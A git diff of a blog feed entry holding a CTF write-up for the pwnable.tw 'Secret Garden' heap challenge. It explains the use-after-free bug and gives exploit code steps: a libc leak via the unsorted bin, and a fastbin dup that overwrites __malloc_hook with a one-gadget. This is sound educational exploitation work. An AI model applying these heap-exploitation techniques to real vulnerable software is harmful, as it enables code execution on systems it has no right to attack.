@@ -12,17 +12,15 @@
         <title>[pwnable.tw] Secret Garden (350 pts)</title>
         <link rel="alternate" href="https://aesophor.github.io/2022/08/27/pwnable-tw-secret-garden/"/>
         <content type="html">&lt;p&gt;&lt;img data-src=&#34;banner.png&#34; alt=&#34;banner&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;introduction&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#introduction&#34;&gt;#&lt;/a&gt; Introduction&lt;/h1&gt;
-&lt;p&gt;Let’s solve the heap exploitation challenge, &lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wd25hYmxlLnR3L2NoYWxsZW5nZS8jMTI=&#34;&gt;Secret Garden [350 pts]&lt;/span&gt;&lt;/strong&gt; (x86_64, glibc 2.23). In summary:&lt;/p&gt;
+&lt;h1 id=&#34;Introduction&#34;&gt;&lt;a href=&#34;#Introduction&#34; class=&#34;headerlink&#34; title=&#34;Introduction&#34;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Let’s solve the heap exploitation challenge, &lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wd25hYmxlLnR3L2NoYWxsZW5nZS8jMTI=&#34;&gt;Secret Garden [350 pts]&lt;/span&gt;&lt;/strong&gt; (x86_64, glibc 2.23). In summary:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Free a large chunk into the unsorted bin.&lt;/li&gt;
-&lt;li&gt;The  &lt;code&gt;fd&lt;/code&gt;  field of the freed chunk in the unsorted bin contains a libc address whose offset within libc is a fixed value.&lt;/li&gt;
+&lt;li&gt;The &lt;code&gt;fd&lt;/code&gt; field of the freed chunk in the unsorted bin contains a libc address whose offset within libc is a fixed value.&lt;/li&gt;
 &lt;li&gt;Visit the garden and leak the libc base to stdout.&lt;/li&gt;
-&lt;li&gt;Overwrite  &lt;code&gt;__malloc_hook&lt;/code&gt;  with a one gadget using fastbin dup.&lt;/li&gt;
-&lt;li&gt;Trigger our  &lt;code&gt;__malloc_hook&lt;/code&gt;  via  &lt;code&gt;malloc_printerr()&lt;/code&gt; .&lt;/li&gt;
+&lt;li&gt;Overwrite &lt;code&gt;__malloc_hook&lt;/code&gt; with a one gadget using fastbin dup.&lt;/li&gt;
+&lt;li&gt;Trigger our &lt;code&gt;__malloc_hook&lt;/code&gt; via &lt;code&gt;malloc_printerr()&lt;/code&gt;.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h1 id=&#34;analysis&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#analysis&#34;&gt;#&lt;/a&gt; Analysis&lt;/h1&gt;
-&lt;p&gt;Sounds easy enough, eh? This challenge is perfect for someone who’s new to heap exploitation, as it allows us to learn how fastbin dup works, and overall it’s not too complicated. Okay, enough talk, let’s get started. Running the binary shows the following output:&lt;/p&gt;
+&lt;h1 id=&#34;Analysis&#34;&gt;&lt;a href=&#34;#Analysis&#34; class=&#34;headerlink&#34; title=&#34;Analysis&#34;&gt;&lt;/a&gt;Analysis&lt;/h1&gt;&lt;p&gt;Sounds easy enough, eh? This challenge is perfect for someone who’s new to heap exploitation, as it allows us to learn how fastbin dup works, and overall it’s not too complicated. Okay, enough talk, let’s get started. Running the binary shows the following output:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆
 ☆          Secret Garden          ☆
 ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆
@@ -36,33 +34,29 @@
 Your choice :
 &lt;/code&gt;&lt;/pre&gt;
 &lt;br&gt;
+
 &lt;p&gt;Only the first three options are required for exploitation:&lt;/p&gt;
 &lt;ol&gt;
-&lt;li&gt;Raise a flower:
-&lt;ul&gt;
+&lt;li&gt;Raise a flower:&lt;ul&gt;
 &lt;li&gt;malloc() twice.&lt;/li&gt;
 &lt;li&gt;The first malloc(0x28) allocates a flower struct.&lt;/li&gt;
-&lt;li&gt;The second malloc() allows us to specify the size.
-&lt;ul&gt;
+&lt;li&gt;The second malloc() allows us to specify the size.&lt;ul&gt;
 &lt;li&gt;Then it calls read() to let us edit the chunk’s user data.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;Visit the garden:
-&lt;ul&gt;
+&lt;li&gt;Visit the garden:&lt;ul&gt;
 &lt;li&gt;Print all the flowers’s data.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;Remove a flower from the garden (by index):
-&lt;ul&gt;
-&lt;li&gt;Clear the flower struct’s first QWORD (i.e.  &lt;code&gt;fd&lt;/code&gt;  field)&lt;/li&gt;
+&lt;li&gt;Remove a flower from the garden (by index):&lt;ul&gt;
+&lt;li&gt;Clear the flower struct’s first QWORD (i.e. &lt;code&gt;fd&lt;/code&gt; field)&lt;/li&gt;
 &lt;li&gt;free() the flower but doesn’t set it to NULL.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;h1 id=&#34;preparation&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#preparation&#34;&gt;#&lt;/a&gt; Preparation&lt;/h1&gt;
-&lt;p&gt;I suggest using &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NreXNpZGVyL3B3bmRvY2tlcg==&#34;&gt;pwndocker&lt;/span&gt;, since it allows you to switch between different versions of glibc in a breeze, and all the commonly-used exploitation tools are already provided in the container.&lt;/p&gt;
+&lt;h1 id=&#34;Preparation&#34;&gt;&lt;a href=&#34;#Preparation&#34; class=&#34;headerlink&#34; title=&#34;Preparation&#34;&gt;&lt;/a&gt;Preparation&lt;/h1&gt;&lt;p&gt;I suggest using &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NreXNpZGVyL3B3bmRvY2tlcg==&#34;&gt;pwndocker&lt;/span&gt;, since it allows you to switch between different versions of glibc in a breeze, and all the commonly-used exploitation tools are already provided in the container.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Patching ELF&lt;/li&gt;
 &lt;/ul&gt;
@@ -73,30 +67,37 @@ Your choice :
         /glibc/2.23/64/lib/ld-2.23.so =&amp;gt; /lib64/ld-linux-x86-64.so.2 (0x00007f0f1408b000)
 &lt;/code&gt;&lt;/pre&gt;
 &lt;ul&gt;
-&lt;li&gt;To run  &lt;code&gt;secretgarden&lt;/code&gt;  locally with glibc 2.23 (stripped):&lt;/li&gt;
+&lt;li&gt;To run &lt;code&gt;secretgarden&lt;/code&gt; locally with glibc 2.23 (stripped):&lt;/li&gt;
 &lt;/ul&gt;
 &lt;pre&gt;&lt;code&gt;# LD_PRELOAD=./libc.so.6 ./secretgarden
 &lt;/code&gt;&lt;/pre&gt;
 &lt;ul&gt;
-&lt;li&gt;To run  &lt;code&gt;secretgarden&lt;/code&gt;  locally with glibc 2.23 (non-stripped):&lt;/li&gt;
+&lt;li&gt;To run &lt;code&gt;secretgarden&lt;/code&gt; locally with glibc 2.23 (non-stripped):&lt;/li&gt;
 &lt;/ul&gt;
 &lt;pre&gt;&lt;code&gt;# ./secretgarden
 &lt;/code&gt;&lt;/pre&gt;
 &lt;blockquote&gt;
-&lt;p&gt;Note:&lt;br&gt;
-The non-stripped version of glibc should only be used during exploit script development. You’ll finally need to switch over to the stripped version which comes with the challenge, because they have different offsets for symbols.&lt;/p&gt;
+&lt;p&gt;Note:&lt;br&gt;The non-stripped version of glibc should only be used during exploit script development. You’ll finally need to switch over to the stripped version which comes with the challenge, because they have different offsets for symbols.&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h1 id=&#34;vulnerability&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vulnerability&#34;&gt;#&lt;/a&gt; Vulnerability&lt;/h1&gt;
-&lt;p&gt;The third option, “remove a flower from the garden”, contains an obvious UAF vulnerability, as it doesn’t set the freed pointer to NULL.&lt;/p&gt;
-&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;_DWORD &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;ptrToFdField&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// rax&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; index&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// [rsp+4h] [rbp-14h] BYREF&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index &lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;99&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ptrToFdField &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;_DWORD &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;flowers&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0LL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;ptrToFdField &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token function&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flowers&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8LL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Successful&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;To reach the crashing state of this program, we only need to raise a flower and remove it twice.&lt;/p&gt;
+&lt;h1 id=&#34;Vulnerability&#34;&gt;&lt;a href=&#34;#Vulnerability&#34; class=&#34;headerlink&#34; title=&#34;Vulnerability&#34;&gt;&lt;/a&gt;Vulnerability&lt;/h1&gt;&lt;p&gt;The third option, “remove a flower from the garden”, contains an obvious UAF vulnerability, as it doesn’t set the freed pointer to NULL.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;_DWORD *ptrToFdField; // rax
+unsigned int index; // [rsp+4h] [rbp-14h] BYREF
+  
+if (index &amp;lt;= 99 &amp;amp;&amp;amp; (ptrToFdField = (_DWORD *)flowers[index]) != 0LL) &amp;#123;
+    *ptrToFdField = 0;
+    free(*(void **)(flowers[index] + 8LL));
+    return puts(&amp;quot;Successful&amp;quot;);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To reach the crashing state of this program, we only need to raise a flower and remove it twice.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;Your choice : 3
 Which flower do you want to remove from the garden:0
-*** Error in `./secretgarden&#39;: double free or corruption (fasttop): 0x0000558b995ae450 ***
+*** Error in `./secretgarden&amp;#39;: double free or corruption (fasttop): 0x0000558b995ae450 ***
 Aborted (core dumped)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;With this vulnerability, we can perform fastbin dup by double freeing a flower. Unfortunately, as all the protections (except FORTIFY) are enabled in this challenge, GOT hijacking is not an easy option. We’ll need to find a way to leak libc base and overwrite either  &lt;code&gt;__malloc_hook&lt;/code&gt;  or  &lt;code&gt;__free_hook&lt;/code&gt;  with the address of an one gadget.&lt;/p&gt;
+&lt;p&gt;With this vulnerability, we can perform fastbin dup by double freeing a flower. Unfortunately, as all the protections (except FORTIFY) are enabled in this challenge, GOT hijacking is not an easy option. We’ll need to find a way to leak libc base and overwrite either &lt;code&gt;__malloc_hook&lt;/code&gt; or &lt;code&gt;__free_hook&lt;/code&gt; with the address of an one gadget.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;# checksec --file ./secretgarden
-[*] &#39;/ctf/work/pwnable.tw/secret-garden/secretgarden&#39;
+[*] &amp;#39;/ctf/work/pwnable.tw/secret-garden/secretgarden&amp;#39;
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    Canary found
@@ -104,53 +105,50 @@ Aborted (core dumped)
     PIE:      PIE enabled
     FORTIFY:  Enabled
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h1 id=&#34;exploitation&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exploitation&#34;&gt;#&lt;/a&gt; Exploitation&lt;/h1&gt;
-&lt;p&gt;Before we begin, let’s pay attention to the first option, “raise a flower”. Remember that it calls malloc() twice, so if we write  &lt;code&gt;chall.create(0x420)&lt;/code&gt;  it will:&lt;/p&gt;
+&lt;h1 id=&#34;Exploitation&#34;&gt;&lt;a href=&#34;#Exploitation&#34; class=&#34;headerlink&#34; title=&#34;Exploitation&#34;&gt;&lt;/a&gt;Exploitation&lt;/h1&gt;&lt;p&gt;Before we begin, let’s pay attention to the first option, “raise a flower”. Remember that it calls malloc() twice, so if we write &lt;code&gt;chall.create(0x420)&lt;/code&gt; it will:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;malloc(0x28), which returns a 0x30-byte chunk (including the header)&lt;/li&gt;
 &lt;li&gt;malloc(0x420), which returns a 0x430-byte chunk (including the header)&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id=&#34;leaking-libc-base&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#leaking-libc-base&#34;&gt;#&lt;/a&gt; Leaking libc base&lt;/h2&gt;
-&lt;p&gt;We can allocate and free a large chunk (0x420 bytes) into the unsorted bin, and print its  &lt;code&gt;fd&lt;/code&gt;  field to stdout.&lt;/p&gt;
+&lt;h2 id=&#34;Leaking-libc-base&#34;&gt;&lt;a href=&#34;#Leaking-libc-base&#34; class=&#34;headerlink&#34; title=&#34;Leaking libc base&#34;&gt;&lt;/a&gt;Leaking libc base&lt;/h2&gt;&lt;p&gt;We can allocate and free a large chunk (0x420 bytes) into the unsorted bin, and print its &lt;code&gt;fd&lt;/code&gt; field to stdout.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;chall.create(0x420)
 chall.remove(0)
 chall.visit()
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;bin1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;bin1.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Wait, the freed chunk doesn’t go into the unsorted bin! That’s because the large chunk we’ve allocated is next to the top chunk, and when it is freed, it will be merged into the top chunk. To workaround this, simply allocate another small chunk with whatever size other than 0x28.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;chall.create(0x420)
 chall.create(0x38) # new
 chall.remove(0)
 chall.visit()
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;bin2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Good. The large chunk now goes into the unsorted bin. To print it via the second option, “visit the garden”, we need to allocate it again and make sure we don’t overwrite the  &lt;code&gt;fd&lt;/code&gt;  field.&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;bin2.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Good. The large chunk now goes into the unsorted bin. To print it via the second option, “visit the garden”, we need to allocate it again and make sure we don’t overwrite the &lt;code&gt;fd&lt;/code&gt; field.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;chall.create(0x420)
 chall.create(0x38)
 chall.remove(0)
-chall.create(0x420, b&#39;&#39;) # new
+chall.create(0x420, b&amp;#39;&amp;#39;) # new
 chall.visit()
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;bin3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Unfortunately, if we choose option 1, it won’t return us the exact same 0x430-byte chunk from before. As we can see, option 1 calls  &lt;code&gt;malloc()&lt;/code&gt;  twice, 0x28 and 0x420 respectively. So when the program calls  &lt;code&gt;malloc(0x28)&lt;/code&gt; , glibc splits our 0x430-byte free chunk in the unsorted bin into two halves: (1) a 0x30-byte chunk, and (2) a 0x400-byte chunk. This former is returned to the user, while the latter is put into a large bin.&lt;/p&gt;
-&lt;p&gt;To workaround this, we need to place a 0x30-byte chunk in a fastbin, so that glibc can return that chunk instead of splitting from our 0x430-byte chunk. As shown below, the  &lt;code&gt;fd&lt;/code&gt;  field of the 0x430-byte chunk is successfully leaked to stdout.&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;bin3.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Unfortunately, if we choose option 1, it won’t return us the exact same 0x430-byte chunk from before. As we can see, option 1 calls &lt;code&gt;malloc()&lt;/code&gt; twice, 0x28 and 0x420 respectively. So when the program calls &lt;code&gt;malloc(0x28)&lt;/code&gt;, glibc splits our 0x430-byte free chunk in the unsorted bin into two halves: (1) a 0x30-byte chunk, and (2) a 0x400-byte chunk. This former is returned to the user, while the latter is put into a large bin.&lt;/p&gt;
+&lt;p&gt;To workaround this, we need to place a 0x30-byte chunk in a fastbin, so that glibc can return that chunk instead of splitting from our 0x430-byte chunk. As shown below, the &lt;code&gt;fd&lt;/code&gt; field of the 0x430-byte chunk is successfully leaked to stdout.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;chall.create(0x420)
 chall.create(0x38)
 chall.create(0x28) # new
 chall.remove(2)    # new
 chall.remove(0)
-chall.create(0x420, b&#39;&#39;)
+chall.create(0x420, b&amp;#39;&amp;#39;)
 chall.visit()
 &lt;/code&gt;&lt;/pre&gt;
 &lt;pre&gt;&lt;code&gt;[*] leaked: 0x7fdad280db0a
 [*] leaked libc_base: 0x7fdad244a000
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;leaked.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;overwriting-__malloc_hooklibc-via-fastbin-dup&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#overwriting-__malloc_hooklibc-via-fastbin-dup&#34;&gt;#&lt;/a&gt; Overwriting __malloc_hook@libc via fastbin dup&lt;/h2&gt;
-&lt;p&gt;Next, we can use the &lt;strong&gt;fastbin dup&lt;/strong&gt; technique to achieve arbitrary write. We need to either:&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;leaked.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Overwriting-malloc-hook-libc-via-fastbin-dup&#34;&gt;&lt;a href=&#34;#Overwriting-malloc-hook-libc-via-fastbin-dup&#34; class=&#34;headerlink&#34; title=&#34;Overwriting __malloc_hook@libc via fastbin dup&#34;&gt;&lt;/a&gt;Overwriting __malloc_hook@libc via fastbin dup&lt;/h2&gt;&lt;p&gt;Next, we can use the &lt;strong&gt;fastbin dup&lt;/strong&gt; technique to achieve arbitrary write. We need to either:&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;overwrite  &lt;code&gt;__malloc_hook@libc&lt;/code&gt;  and trigger  &lt;code&gt;malloc()&lt;/code&gt; , or&lt;/li&gt;
-&lt;li&gt;overwrite  &lt;code&gt;__free_hook@libc&lt;/code&gt;  and trigger  &lt;code&gt;free()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;overwrite &lt;code&gt;__malloc_hook@libc&lt;/code&gt; and trigger &lt;code&gt;malloc()&lt;/code&gt;, or&lt;/li&gt;
+&lt;li&gt;overwrite &lt;code&gt;__free_hook@libc&lt;/code&gt; and trigger &lt;code&gt;free()&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Let’s try to bypass the infamous “double free or corruption (fasttop)” error with the ABA pattern [&lt;a href=&#34;#check-1-double-free-or-corruption-fasttop&#34;&gt;1&lt;/a&gt;].&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;chall.create(0x68)
@@ -159,47 +157,46 @@ chall.remove(4)
 chall.remove(5)
 chall.remove(4)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;bin4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Good. We now have two overlapping (same) chunks in the same fastbin. Now we can overwrite the  &lt;code&gt;fd&lt;/code&gt;  field of this chunk.&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;bin4.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Good. We now have two overlapping (same) chunks in the same fastbin. Now we can overwrite the &lt;code&gt;fd&lt;/code&gt; field of this chunk.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;chall.create(0x68)
 chall.create(0x68)
 chall.remove(4)
 chall.remove(5)
 chall.remove(4)
-chall.create(0x68, p64(libc_base + libc.sym[&#39;__free_hook&#39;]))
+chall.create(0x68, p64(libc_base + libc.sym[&amp;#39;__free_hook&amp;#39;]))
 chall.create(0x68)
 chall.create(0x68)
 chall.create(0x68, p64(libc_base + one_gadget))
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;bin5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Okay, here’s another restriction we need to bypass. In glibc,  &lt;code&gt;malloc()&lt;/code&gt;  will refuse to return a freed chunk from a fastbin if that chunk’s  &lt;code&gt;size&lt;/code&gt;  field is incorrect [&lt;a href=&#34;#check-2-malloc-memory-corruption-fast&#34;&gt;2&lt;/a&gt;].&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Error in `/ctf/work/pwnable.tw/secret-garden/secretgarden&#39;: malloc(): memory corruption (fast): 0x00007efdb9063b20 ***
+&lt;p&gt;&lt;img data-src=&#34;bin5.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Okay, here’s another restriction we need to bypass. In glibc, &lt;code&gt;malloc()&lt;/code&gt; will refuse to return a freed chunk from a fastbin if that chunk’s &lt;code&gt;size&lt;/code&gt; field is incorrect [&lt;a href=&#34;#check-2-malloc-memory-corruption-fast&#34;&gt;2&lt;/a&gt;].&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Error in `/ctf/work/pwnable.tw/secret-garden/secretgarden&amp;#39;: malloc(): memory corruption (fast): 0x00007efdb9063b20 ***
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;To bypass this, we need to rethink where we’re trying to write data into. The answer is  &lt;code&gt;__malloc_hook&lt;/code&gt;  or  &lt;code&gt;__free_hook&lt;/code&gt; , right? Let’s take a look at that memory region.&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;hooks.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;7f.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;All the bytes near  &lt;code&gt;__free_hook&lt;/code&gt;  are all NULL bytes, so it’s not easy to be overwritten with fastbin dup. However, there’s a sequence of bytes “7f 00 00 00 00 00 00 00” before  &lt;code&gt;__malloc_hook&lt;/code&gt; . If we use these bytes as the free chunk’s  &lt;code&gt;size&lt;/code&gt;  field, then we’ll get a 0x70-byte free chunk, and this is enough for us to overwrite  &lt;code&gt;__malloc_hook&lt;/code&gt; .&lt;/p&gt;
+&lt;p&gt;To bypass this, we need to rethink where we’re trying to write data into. The answer is &lt;code&gt;__malloc_hook&lt;/code&gt; or &lt;code&gt;__free_hook&lt;/code&gt;, right? Let’s take a look at that memory region.&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;hooks.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;7f.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;All the bytes near &lt;code&gt;__free_hook&lt;/code&gt; are all NULL bytes, so it’s not easy to be overwritten with fastbin dup. However, there’s a sequence of bytes “7f 00 00 00 00 00 00 00” before &lt;code&gt;__malloc_hook&lt;/code&gt;. If we use these bytes as the free chunk’s &lt;code&gt;size&lt;/code&gt; field, then we’ll get a 0x70-byte free chunk, and this is enough for us to overwrite &lt;code&gt;__malloc_hook&lt;/code&gt;.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;chall.create(0x68)
 chall.create(0x68)
 chall.remove(4)
 chall.remove(5)
 chall.remove(4)
-chall.create(0x68, p64(libc_base + libc.sym[&#39;__malloc_hook&#39;] - 35))
+chall.create(0x68, p64(libc_base + libc.sym[&amp;#39;__malloc_hook&amp;#39;] - 35))
 chall.create(0x68)
 chall.create(0x68)
-chall.create(0x68, 19 * b&#39;A&#39; + p64(libc_base + one_gadget))
+chall.create(0x68, 19 * b&amp;#39;A&amp;#39; + p64(libc_base + one_gadget))
 chall.create(0x68) # trigger __malloc_hook
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;triggering-our-__malloc_hook&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#triggering-our-__malloc_hook&#34;&gt;#&lt;/a&gt; Triggering our __malloc_hook&lt;/h2&gt;
-&lt;p&gt;The last thing that will probably annoy you is that the constraints of all four one gadgets are unsatisfiable when  &lt;code&gt;__malloc_hook&lt;/code&gt;  is triggered via option 1, “raise a flower”.&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;one_gadget.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
